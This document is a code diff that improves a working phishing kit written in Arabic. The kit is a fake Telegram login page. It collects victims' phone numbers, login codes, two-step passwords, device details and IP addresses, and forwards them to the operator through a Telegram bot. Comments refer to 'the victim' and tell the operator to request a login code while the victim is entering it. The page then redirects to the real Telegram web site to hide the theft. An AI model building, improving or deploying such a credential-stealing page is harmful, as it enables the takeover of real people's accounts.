@@ -1,6 +1,25 @@
 <?php
-// توكن البوت الخاص بك
+// منع أي مخرجات غير متوقعة قبل JSON
+error_reporting(0);
+ini_set('display_errors', 0);
+
+// توكن البوت (تأكد من صحته)
 $botToken = "BBOTTTTTTTTTTT";
+
+// دالة لجلب IP الحقيقي للزائر
+function getRealIp() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        $ip = $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    }
+    // تنظيف IP إذا كان هناك عدة عناوين
+    if (strpos($ip, ',') !== false) {
+        $ip = explode(',', $ip)[0];
+    }
+    return trim($ip);
+}
 
 // دالة لإرسال الرسائل إلى التليجرام
 function sendTelegramMessage($chatId, $message, $botToken) {
@@ -16,23 +35,47 @@ function sendTelegramMessage($chatId, $message, $botToken) {
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
     $result = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
 
-    return $result;
+    $response = json_decode($result, true);
+    if ($httpCode == 200 && isset($response['ok']) && $response['ok'] === true) {
+        return ['success' => true];
+    } else {
+        $error = isset($response['description']) ? $response['description'] : 'HTTP Error ' . $httpCode;
+        return ['success' => false, 'error' => $error];
+    }
 }
 
-// إذا كان الطلب بواسطة POST، فإننا نتعامل مع إرسال البيانات من JavaScript
+// معالجة الطلبات POST فقط
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $input = json_decode(file_get_contents('php://input'), true);
-    $chatId = $input['chatId'];
-    $step = $input['step'];
-    $data = $input['data'] ?? null;
-    $deviceInfo = $input['deviceInfo'] ?? null;
-
+    header('Content-Type: application/json');
+    
+    $rawInput = file_get_contents('php://input');
+    $input = json_decode($rawInput, true);
+    
+    if (!$input) {
+        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON input']);
+        exit;
+    }
+    
+    $chatId = isset($input['chatId']) ? $input['chatId'] : null;
+    $step = isset($input['step']) ? $input['step'] : null;
+    $data = isset($input['data']) ? $input['data'] : null;
+    $deviceInfo = isset($input['deviceInfo']) ? $input['deviceInfo'] : null;
+    
+    // التحقق من وجود chatId
+    if (!$chatId) {
+        echo json_encode(['status' => 'error', 'message' => 'معرف الدردشة (chat ID) غير موجود. تأكد من استخدام الرابط الصحيح.']);
+        exit;
+    }
+    
+    $ip = getRealIp();
+    
     if ($data && $deviceInfo) {
         if ($step === 'complete') {
-            // إرسال بيانات تسجيل الدخول النهائية
             $loginMessage = "
 📱 <b>بيانات تسجيل دخول Telegram</b>
 
@@ -44,7 +87,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 📱 <b>User Agent:</b> {$deviceInfo['userAgent']}
 🔋 <b>البطارية:</b> {$deviceInfo['battery']}
 🖥️ <b>النظام:</b> {$deviceInfo['platform']}
-🌐 <b>IP:</b> {$_SERVER['REMOTE_ADDR']}
+🌐 <b>IP الحقيقي:</b> {$ip}
 📶 <b>نوع الاتصال:</b> {$deviceInfo['connection']}
 🗣️ <b>اللغة:</b> {$deviceInfo['language']}
 🕒 <b>المنطقة الزمنية:</b> {$deviceInfo['timezone']}
@@ -54,32 +97,39 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             ";
             $result = sendTelegramMessage($chatId, $loginMessage, $botToken);
         } else {
-            // إرسال بيانات كل مرحلة
             $stageMessage = "
 📱 <b>مرحلة تسجيل دخول Telegram</b>
 
 🔹 <b>المرحلة:</b> $step
 📞 <b>رقم الهاتف:</b> <code>{$data['phone']}</code>
-" . (isset($data['code']) ? "🔢 <b>код التحقق:</b> <code>{$data['code']}</code>\n" : "") . "
-🌐 <b>IP:</b> {$_SERVER['REMOTE_ADDR']}
+" . (isset($data['code']) ? "🔢 <b>كود التحقق:</b> <code>{$data['code']}</code>\n" : "") . "
+🌐 <b>IP الحقيقي:</b> {$ip}
 📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
             ";
             
-            // إضافة رسالة خاصة عند إرسال رقم الهاتف
             if ($step === 'phone') {
-                $stageMessage .= "\n\n⚠️ <b>أطلب كود للرقم الأن ع هاتفك لأن الأن مطلوب ادخال الكود عند الضحيه</b>";
+                $stageMessage .= "\n\n⚠️ <b>تم إرسال رقم الهاتف. انتظر إدخال الكود من الضحية.</b>";
             }
             
             $result = sendTelegramMessage($chatId, $stageMessage, $botToken);
         }
+        
+        if ($result['success']) {
+            $nextStep = 'complete';
+            if ($step === 'phone') $nextStep = 'code';
+            elseif ($step === 'code') $nextStep = 'password';
+            echo json_encode(['status' => 'success', 'nextStep' => $nextStep]);
+        } else {
+            echo json_encode(['status' => 'error', 'message' => 'فشل إرسال البيانات إلى البوت: ' . $result['error']]);
+        }
+    } else {
+        echo json_encode(['status' => 'error', 'message' => 'بيانات غير مكتملة']);
     }
-    
-    header('Content-Type: application/json');
-    echo json_encode(['status' => 'success', 'nextStep' => $step === 'phone' ? 'code' : ($step === 'code' ? 'password' : 'complete')]);
     exit;
 }
-?>
 
+// إذا لم يكن POST، نعرض الصفحة العادية (HTML)
+?>
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -119,7 +169,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
       width: 100px;
       height: 100px;
       margin-bottom: 15px;
-      border-radius: 50%;
+      display: inline-block;
     }
     
     .login-form {
@@ -255,7 +305,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
       text-decoration: underline;
     }
     
-    /* عناصر التحميل */
     .loader {
         width: 18px;
         height: 18px;
@@ -354,7 +403,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
       margin-bottom: 16px;
     }
     
-    /* منع الكتابة غير الرقمية في حقول الكود */
     .numbers-only {
       -moz-appearance: textfield;
     }
@@ -378,8 +426,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <body>
   <div class="container">
     <div class="logo-container">
-      <!-- شعار Telegram -->
-      <img src="https://dev-ianstagram.pantheonsite.io/wp-content/uploads/2025/08/Screenshot_20250826_032744_Chrome.jpg" class="telegram-logo" alt="Telegram Logo">
+      <svg class="telegram-logo" viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="120" cy="120" r="120" fill="#26A5E4"/>
+        <path d="M94.5 143.5L91.5 172.5C94.5 172.5 96 171 97.5 169.5L111.5 156.5L140.5 178.5C145.5 181.5 149 179.5 150.5 174L165.5 66.5C167.5 60 163.5 56.5 158.5 58.5L54.5 109C49 111.5 49 115.5 53.5 117.5L81.5 125.5L139.5 81C142.5 79 145.5 80 143.5 82L94.5 143.5Z" fill="white"/>
+      </svg>
       <h1>Telegram</h1>
     </div>
     
@@ -465,8 +515,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   </div>
 
 <script>
+  // الحصول على chatId من الرابط (مثال: ?ID=123456789)
   const params = new URLSearchParams(window.location.search);
-  const chatId = params.get('ID'); // نحصل على chatId من الرابط
+  const chatId = params.get('ID');
+
+  if (!chatId) {
+    document.body.innerHTML = '<div style="text-align:center; padding:50px; direction:rtl;"><h2 style="color:red;">خطأ: لم يتم توفير معرف الدردشة (chat ID).</h2><p>يرجى استخدام الرابط الصحيح الذي يحتوي على ?ID=رقم_المستخدم</p></div>';
+    throw new Error('Chat ID is missing');
+  }
 
   // عناصر واجهة المستخدم
   const stepPhone = document.getElementById('stepPhone');
@@ -476,8 +532,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   const step2 = document.getElementById('step2');
   const step3 = document.getElementById('step3');
   const loader = document.getElementById('loader');
-  const status = document.getElementById('status');
-  const errorMessage = document.getElementById('errorMessage');
+  const statusDiv = document.getElementById('status');
+  const errorMessageDiv = document.getElementById('errorMessage');
   
   let currentStep = 'phone';
   let userPhone = '';
@@ -490,7 +546,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     });
     
     input.addEventListener('keydown', function(e) {
-      // السماح فقط بالأرقام ومفاتيح التحكم
       if (!((e.key >= '0' && e.key <= '9') || 
             e.key === 'Backspace' || 
             e.key === 'Delete' || 
@@ -529,14 +584,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     const currentInput = document.getElementById(`code${current}`);
     const nextInput = document.getElementById(`code${current + 1}`);
     
-    // التأكد من أن القيمة رقمية فقط
     currentInput.value = currentInput.value.replace(/[^0-9]/g, '');
     
     if (currentInput.value.length === 1 && nextInput) {
       nextInput.focus();
     }
     
-    // إذا كان هذا هو الحقل الأخير، نقوم بجمع الكود
     if (current === 5 && currentInput.value.length === 1) {
       compileCode();
     }
@@ -607,135 +660,130 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         body: JSON.stringify(requestData)
       });
       
-      return await response.json();
+      if (!response.ok) {
+        throw new Error(`HTTP error ${response.status}`);
+      }
+      
+      const json = await response.json();
+      return json;
     } catch (error) {
-      console.error('Error sending to server:', error);
-      return {status: 'error', error: error.message};
+      console.error('Fetch error:', error);
+      return {status: 'error', message: 'فشل الاتصال بالخادم: ' + error.message};
     }
   }
 
-  function updateStatus(message) {
-    status.textContent = message;
-    status.style.display = 'block';
+  function updateStatus(message, isLoading = true) {
+    statusDiv.textContent = message;
+    statusDiv.style.display = 'block';
+    if (isLoading) {
+      loader.style.display = 'block';
+    } else {
+      loader.style.display = 'none';
+    }
   }
 
-  function showError() {
-    errorMessage.style.display = 'block';
+  function showError(message) {
+    errorMessageDiv.textContent = message || 'حدث خطأ غير متوقع. يرجى المحاولة مرة أخرى.';
+    errorMessageDiv.style.display = 'block';
+    setTimeout(() => {
+      errorMessageDiv.style.display = 'none';
+    }, 5000);
   }
 
   function hideError() {
-    errorMessage.style.display = 'none';
+    errorMessageDiv.style.display = 'none';
   }
 
-  // معالجة إدخال رقم الهاتف
   async function submitPhone() {
-    const countryCode = document.getElementById('countryCode').value;
-    const phone = document.getElementById('phone').value;
-    const fullPhone = countryCode + phone;
+    const countryCode = document.getElementById('countryCode').value.trim();
+    const phone = document.getElementById('phone').value.trim();
     
     if (!countryCode || !phone) {
-      showError();
-      errorMessage.textContent = 'يرجى إدخال رمز الدولة ورقم الهاتف';
+      showError('يرجى إدخال رمز الدولة ورقم الهاتف');
       return;
     }
     
+    const fullPhone = countryCode + phone;
     userPhone = fullPhone;
     
-    // إظهار عناصر التحميل
-    loader.style.display = 'block';
-    status.style.display = 'block';
+    updateStatus('جاري إرسال رمز التحقق...', true);
     hideError();
     
-    updateStatus('جاري إرسال رمز التحقق...');
-    
     try {
-      // إرسال بيانات المرحلة الأولى
       const result = await sendToServer('phone', {phone: fullPhone});
       
       if (result.status === 'success') {
-        updateStatus('تم إرسال رمز التحقق إلى حسابك على Telegram');
+        updateStatus('تم إرسال رمز التحقق إلى حسابك على Telegram', false);
         
-        // الانتقال إلى المرحلة الثانية
         setTimeout(() => {
           currentStep = 'code';
           updateStepIndicator('code');
           document.getElementById('code1').focus();
           loader.style.display = 'none';
-          status.style.display = 'none';
-        }, 2000);
+          statusDiv.style.display = 'none';
+        }, 1500);
       } else {
-        throw new Error('Failed to send phone data');
+        throw new Error(result.message || 'فشل إرسال البيانات');
       }
     } catch (error) {
-      console.error('Error during phone submission:', error);
-      showError();
-      updateStatus('فشل في إرسال رمز التحقق');
+      console.error(error);
+      showError(error.message);
+      updateStatus('', false);
+      loader.style.display = 'none';
+      statusDiv.style.display = 'none';
     }
   }
 
-  // معالجة إدخال كود التحقق
   async function submitCode() {
     const code = compileCode();
     
     if (!code || code.length !== 5) {
-      showError();
-      errorMessage.textContent = 'يرجى إدخال رمز التحقق المكون من 5 أرقام';
+      showError('يرجى إدخال رمز التحقق المكون من 5 أرقام');
       return;
     }
     
     userCode = code;
     
-    // إظهار عناصر التحميل
-    loader.style.display = 'block';
-    status.style.display = 'block';
+    updateStatus('جاري التحقق من الرمز...', true);
     hideError();
     
-    updateStatus('جاري التحقق من الرمز...');
-    
     try {
-      // إرسال بيانات المرحلة الثانية
       const result = await sendToServer('code', {phone: userPhone, code: code});
       
       if (result.status === 'success') {
-        updateStatus('تم التحقق من الرمز بنجاح');
+        updateStatus('تم التحقق من الرمز بنجاح', false);
         
-        // الانتقال إلى المرحلة الثالثة
         setTimeout(() => {
           currentStep = 'password';
           updateStepIndicator('password');
           document.getElementById('password').focus();
           loader.style.display = 'none';
-          status.style.display = 'none';
-        }, 2000);
+          statusDiv.style.display = 'none';
+        }, 1500);
       } else {
-        throw new Error('Failed to send code data');
+        throw new Error(result.message || 'فشل التحقق من الرمز');
       }
     } catch (error) {
-      console.error('Error during code submission:', error);
-      showError();
-      updateStatus('فشل في التحقق من الرمز');
+      console.error(error);
+      showError(error.message);
+      updateStatus('', false);
+      loader.style.display = 'none';
+      statusDiv.style.display = 'none';
     }
   }
 
-  // معالجة إدخال كلمة المرور
   async function submitPassword() {
-    const password = document.getElementById('password').value;
+    const password = document.getElementById('password').value.trim();
     
     if (!password) {
-      showError();
-      errorMessage.textContent = 'يرجى إدخال كلمة المرور';
+      showError('يرجى إدخال كلمة المرور');
       return;
     }
     
-    // إظهار عناصر التحميل
-    loader.style.display = 'block';
-    status.style.display = 'block';
+    updateStatus('جاري تسجيل الدخول...', true);
     hideError();
     
-    updateStatus('جاري تسجيل الدخول...');
-    
     try {
-      // إرسال بيانات المرحلة الثالثة
       const result = await sendToServer('complete', {
         phone: userPhone,
         code: userCode,
@@ -743,23 +791,23 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
       });
       
       if (result.status === 'success') {
-        updateStatus('تم تسجيل الدخول بنجاح!');
+        updateStatus('تم تسجيل الدخول بنجاح! جاري التحويل...', false);
         
-        // إعادة توجيه إلى Telegram بعد ثواني (وهمي)
         setTimeout(() => {
           window.location.href = 'https://web.telegram.org';
         }, 2000);
       } else {
-        throw new Error('Failed to send complete data');
+        throw new Error(result.message || 'فشل تسجيل الدخول');
       }
     } catch (error) {
-      console.error('Error during password submission:', error);
-      showError();
-      updateStatus('فشل في تسجيل الدخول');
+      console.error(error);
+      showError(error.message);
+      updateStatus('', false);
+      loader.style.display = 'none';
+      statusDiv.style.display = 'none';
     }
   }
 
-  // السماح بالضغط على Enter في الحقول
   document.getElementById('countryCode').addEventListener('keypress', function(e) {
     if (e.key === 'Enter') {
       document.getElementById('phone').focus();
@@ -778,7 +826,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
   });
 
-  // إضافة إمكانية التنقل بين حقول الكود باستخدام لوحة المفاتيح
   for (let i = 1; i <= 5; i++) {
     document.getElementById(`code${i}`).addEventListener('keydown', function(e) {
       if (e.key === 'Backspace' && this.value === '' && i > 1) {
